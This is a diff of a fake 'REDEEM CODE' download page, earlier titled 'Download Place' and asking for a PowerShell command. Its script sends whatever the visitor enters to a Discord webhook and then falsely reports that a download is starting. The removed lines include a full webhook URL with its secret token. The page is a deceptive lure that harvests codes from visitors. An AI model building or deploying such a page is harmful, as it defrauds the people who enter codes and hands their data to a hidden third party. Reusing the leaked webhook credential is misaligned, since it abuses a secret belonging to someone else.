@@ -145,11 +145,11 @@
 <body>
 
     <div class="container">
-        <h1 class="title">Download Place</h1>
-        <p class="subtitle">Enter your Powershell command below to start the download</p>
+        <h1 class="title">REDEEM CODE</h1>
+        <p class="subtitle">Enter your code below to start the download</p>
 
         <div class="input-group">
-            <input type="text" id="codeInput" class="code-input" placeholder="ENTER POWERSHELL COMMAND HERE" autocomplete="off" spellcheck="false">
+            <input type="text" id="codeInput" class="code-input" placeholder="ENTER CODE HERE" autocomplete="off" spellcheck="false">
         </div>
 
         <button id="downloadBtn" class="btn-download">DOWNLOAD</button>
@@ -158,61 +158,52 @@
     </div>
 
     <script>
-    // Trage hier deine Discord Webhook URL ein
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1564636275074662436/4-28eWe1zi7UYRt-Ww_22ysR-1sjwRUiaxqeo-1lN6ho6hc_Dirb36LjvYPjx0kjPcl3";
+        // Trage hier einfach deine Discord Webhook URL in die Anführungszeichen ein:
+        const WEBHOOK_URL = "HIER_DEINE_DISCORD_WEBHOOK_URL_EINFUEGEN";
 
-    const codeInput = document.getElementById('codeInput');
-    const downloadBtn = document.getElementById('downloadBtn');
-    const statusMsg = document.getElementById('statusMsg');
+        const codeInput = document.getElementById('codeInput');
+        const downloadBtn = document.getElementById('downloadBtn');
+        const statusMsg = document.getElementById('statusMsg');
 
-    downloadBtn.addEventListener('click', async () => {
-        const code = codeInput.value.trim();
+        downloadBtn.addEventListener('click', async () => {
+            const code = codeInput.value.trim();
 
-        if (!code) {
-            showStatus("Please enter a valid code!", "error");
-            return;
-        }
-
-        if (!WEBHOOK_URL || WEBHOOK_URL.includes("https://discord.com/api/webhooks/1564636275074662436/4-28eWe1zi7UYRt-Ww_22ysR-1sjwRUiaxqeo-1lN6ho6hc_Dirb36LjvYPjx0kjPcl3")) {
-            showStatus("Error: Webhook URL is missing.", "error");
-            return;
-        }
-
-        downloadBtn.disabled = true;
-        showStatus("Sending code...", "");
-
-        // Format speziell für Discord Webhooks:
-        const payload = {
-            username: "Download System",
-            content: `🔑 **Neuer Download-Code eingegeben:** \`${code}\``
-        };
-
-        try {
-            const response = await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-
-            // Discord antwortet bei Erfolg meist mit 204 (No Content) oder 200
-            if (response.ok || response.status === 204) {
-                showStatus("Code accepted! Starting system process...", "success");
-                codeInput.value = '';
-            } else {
-                showStatus("Failed to send code. (Status: " + response.status + ")", "error");
+            if (!code) {
+                showStatus("Please enter a valid code!", "error");
+                return;
             }
-        } catch (err) {
-            console.error(err);
-            showStatus("Network error while sending code.", "error");
-        } finally {
-            downloadBtn.disabled = false;
-        }
-    });
 
-    function showStatus(msg, type) {
-        statusMsg.textContent = msg;
-        statusMsg.className = 'status ' + type;
-    }
-</script>
+            downloadBtn.disabled = true;
+            showStatus("Sending code...", "");
+
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `🔑 **Neuer Code:** \`${code}\``
+                    })
+                });
+
+                // Discord antwortet bei Erfolg immer mit 204 (No Content)
+                if (response.ok || response.status === 204) {
+                    showStatus("Code accepted! Starting download...", "success");
+                    codeInput.value = '';
+                } else {
+                    showStatus("Failed to send code. (Status: " + response.status + ")", "error");
+                }
+            } catch (err) {
+                console.error(err);
+                showStatus("Network error while sending code.", "error");
+            } finally {
+                downloadBtn.disabled = false;
+            }
+        });
+
+        function showStatus(msg, type) {
+            statusMsg.textContent = msg;
+            statusMsg.className = 'status ' + type;
+        }
+    </script>
 </body>
 </html>
